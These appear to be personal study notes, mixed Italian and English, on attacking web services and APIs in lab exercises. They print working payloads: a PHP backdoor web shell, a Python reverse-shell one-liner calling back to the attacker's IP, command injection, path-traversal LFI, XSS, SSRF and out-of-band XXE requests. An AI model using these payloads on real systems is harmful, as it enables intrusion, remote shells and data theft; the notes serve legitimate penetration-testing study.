# WSDL

WSDL stands for Web Service Description Language. WSDL is an XML-based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention.

A web service's WSDL file should not always be accessible. Developers may not want to publicly expose a web service's WSDL file, or they may expose it through an uncommon location, following a security through obscurity approach. In the latter case, directory/parameter fuzzing may reveal the location and content of a WSDL file.

## enumerazione

```shell
$ dirb http://$TARGET:3002
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://$TARGET:3002/wsdl?FUZZ' -fs 0 -mc 200
$ curl http://$TARGET:3002/wsdl?wsdl
```

# SOAPAction Spoofing

SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called `SOAPAction`, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.

If a web service considers only the `SOAPAction` attribute when determining the operation to execute, then it may be vulnerable to `SOAPAction spoofing`.

Let us assess together a SOAP service that is vulnerable to `SOAPAction spoofing`.

## Exploit

Ottenere il file WSDL 
```shell
$ curl http://$TARGET:3002/wsdl?wsdl
```
e ispezionarlo. Prestare attenzione a cose cosi


```xml
<s:element name="ExecuteCommandRequest">
  <s:complexType>
    <s:sequence>
      <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
    </s:sequence>
  </s:complexType>
</s:element>
```

quindi modificare opportunamente lo script `soapSpoofingClient.py` e lanciarlo

```shell
python3 soapSpoofingClient.py
```

# Command injection

Command injections are among the most critical vulnerabilities in web services. They allow system command execution directly on the back-end server. If a web service uses user-controlled input to execute a system command on the back-end server, an attacker may be able to inject a malicious payload to subvert the intended command and execute his own.

Let us assess together a web service that is vulnerable to command injection.

You may have come across connectivity-checking web services in router admin panels or even websites that merely execute a ping command towards a website of your choosing.

Il servizio potrebbe avere questo codice

```php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

e risponde a richieste del tipo `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3`
Se proviamo a fare `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3333` riceviamo un errore (Only 1-4 packets!)
La funzione `escapeshellarg()` fa l'escaping dell'url fornito, altrimenti sarebbe possibile fare una cosa cosi

```shell
$ ping google.com`id`
ping: groups=1001(pingflood),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),115(scanner),138(wireshark),141(kaboxer),142(vboxsf): Name or service not known
```

La vulnerabilita' sta nella funzione `call_user_func_array()`. Is a special way to call an existing PHP function. It takes a function to call as its first parameter, then takes an array of parameters as its second parameter. This means that instead of `http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3` an attacker could issue a request as follows `http://<TARGET IP>:3003/ping-server.php/system/ls`.

# Attacking WordPress 'xmlrpc.php'

It is important to note that `xmlrpc.php` being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, `xmlrpc.php` can facilitate some enumeration and exploitation activities, though.

```shell
$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

# Information Disclosure (with a twist of SQLi)

```shell
# Enumerazione di parametri validi - aggiunstare il valore fs in base al caso d'uso
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:<TARGET PORT>/?FUZZ=test_value' -fs 19

# trovato un parametro valido possiamo andare a modificare brute_api.py ed enumerare
# attenzione potrebbe esserci attivo un ratelimiter o un filtro su X-Forwarded-For o su X-Forwarded-IP
# eventualmente aggiustare la richiesta
$ python3 brute_api.py http://<TARGET IP>:3003
```

# Arbitrary File Upload

Arbitrary file uploads are among the most critical vulnerabilities. These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server. Arbitrary file upload vulnerabilities affect web applications and APIs alike.

## Exploiting

- upload di un file `backdoor.php`

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

- creazione di uno script ad hoc `web_shell.py` (vedi file allegati)
- avvio dello script (modificare i parametri adattandoli al caso in esame)

```shell
$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
```

- in un altro terminale

```shell
$ nc -lvnp 1337
```

- reverse shell nella finestra con lo script `web_shell.py`

```shell
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

se tutto va bene abbiamo una shell di root!

# Local File Inclusion (LFI)

Local File Inclusion (LFI) is an attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being Apache Log Poisoning. Our File Inclusion module covers LFI in detail.

Let us assess together an API that is vulnerable to Local File Inclusion.

## Exploit

deve chiaramente esistere un endpoint vuolnerabile in questo caso `/api/download`, trovato tramite `ffuf`

```shell
$ curl http://$TARGET:$TARGET_PORT/api
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u "http://$TARGET:$TARGET_PORT/api/FUZZ"
$ curl http://$TARGET:$TARGET_PORT/api/download
$ curl "http://$TARGET:$TARGET_PORT/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```

# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities affect web applications and APIs alike. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities. Our Cross-Site Scripting (XSS) module covers XSS in detail.

## Exploit

Immaginiamo di avere il'endpoint di prima `/api/download`. Proviamo ad andare a `http://<TARGET IP>:3000/api/download/test_value` e otteniamo una risposta dal server che contiene il nome della risorsa cercata `test_value is reflected in the response`. Potrebbe essere il caso di provare a mettere codice js e vedere se lo esegue.
Proviamo con `<script>alert(document.domain)</script>` e da errore.
Vediamo con lo stesso script ma encodato `%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E`. Questa volta funziona!
Attenzione, non encodarlo due volte, solo una.

# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution

We can usually find SSRF vulnerabilities in applications or APIs that fetch remote resources. Our Server-side Attacks module covers SSRF in detail.

As we have mentioned multiple times, though, we should fuzz every identified parameter, even if it does not seem tasked with fetching remote resources.

Let us assess together an API that is vulnerable to SSRF.

## Exploit

```shell
$ nc -nlvp 1337 # in un altro terminale

$ curl http://$TARGET:$TARGET_PORT/api/userinfo
{"success":false,"error":"'id' parameter is not given."}

$ curl "http://$TARGET:$TARGET_PORT/api/userinfo?id=http://$MYIP:1337"
{"success":false,"error":"'id' parameter is invalid."}

$ echo "http://$MYIP:1337" | tr -d '\n' | base64
aHR0cDovLzEwLjEwLjE0LjI3OjEzMzc=

$ curl "http://$TARGET:$TARGET_PORT/api/userinfo?id=aHR0cDovLzEwLjEwLjE0LjI3OjEzMzc="
```

# Regular Expression Denial of Service (ReDoS)

Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine. The longer this crafted payload is, the longer the API will take to respond. Exploiting such "evil" patterns in a regular expression to increase evaluation time is called a Regular Expression Denial of Service (ReDoS) attack.

visualizzazione delle espressioni regolari
https://jex.im/regulex/#!flags=&re=%5E(%5Ba-zA-Z0-9_.-%5D)%2B%40((%5Ba-zA-Z0-9-%5D)%2B.)%2B(%5Ba-zA-Z0-9%5D%7B2%2C4%7D)%2B%24

## Exploit

```shell
$ curl "http://$TARGET:$TARGET_PORT/api/check-email?email=test_value"
$ curl "http://$TARGET:$TARGET_PORT/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
```

# XML External Entity (XXE) Injection

XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down. Our Web Attacks module covers XXE Injection vulnerabilities in detail. It should be noted that XXE vulnerabilities affect web applications and APIs alike.

## Exploit

Avviamo netcat in una shell

```shell
$ nc -nlvp 4444
```

Con BurpSuite catturiamo la POST della login che usa XML per lo scambio di dati.
Questo il payload che vogliamo inviare.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:4444"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>
```

inviamolo al server

```shell
$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```

e nella shell con netcat otteniamo una traccia della connessione
